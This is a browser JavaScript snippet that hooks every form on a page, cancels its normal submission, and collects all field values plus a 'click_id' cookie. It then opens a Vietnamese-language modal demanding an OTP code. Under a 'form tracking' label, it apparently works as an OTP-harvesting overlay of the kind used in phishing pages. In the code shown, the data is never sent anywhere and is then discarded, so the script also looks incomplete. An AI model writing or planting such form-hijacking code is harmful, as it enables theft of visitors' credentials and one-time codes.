(function () {
  const style = document.createElement("style");
  style.innerHTML = `
    .otp-modal {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.5);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .otp-modal-content {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      width: 300px;
      text-align: center;
    }
    .otp-modal input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
    }
    .otp-modal button {
      padding: 10px 20px;
      background: #007bff;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
  `;
  document.head.appendChild(style);

  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(";").shift();
    return null;
  }

  function createOtpModal() {
    if (document.getElementById("otpModal")) return;

    const modal = document.createElement("div");
    modal.className = "otp-modal";
    modal.id = "otpModal";
    modal.innerHTML = `
      <div class="otp-modal-content">
        <h3>Nhập OTP</h3>
        <input type="text" id="otpInput" placeholder="Nhập mã OTP">
        <button id="otpSubmit">Xác nhận</button>
      </div>
    `;
    document.body.appendChild(modal);
  }

  function attachFormTracking() {
    document.addEventListener("DOMContentLoaded", function () {
      createOtpModal();

      const otpModal = document.getElementById("otpModal");
      const otpInput = document.getElementById("otpInput");
      const otpSubmit = document.getElementById("otpSubmit");

      let pendingData = null;

      document.querySelectorAll("form").forEach((form) => {
        form.addEventListener("submit", function (e) {
          e.preventDefault();

          const clickId = getCookie("click_id") || "";

          const formDataObj = {};
          new FormData(form).forEach((value, key) => {
            formDataObj[key] = value;
          });
          formDataObj["click_id"] = clickId;

          pendingData = formDataObj;

          otpModal.style.display = "flex";
        });
      });

      otpSubmit.addEventListener("click", function () {
        const otp = otpInput.value.trim();
        if (!otp) {
          alert("Vui lòng nhập OTP");
          return;
        }

        pendingData["otp"] = otp;
        otpModal.style.display = "none";

        otpInput.value = "";
        pendingData = null;
      });
    });
  }

  attachFormTracking();
})();
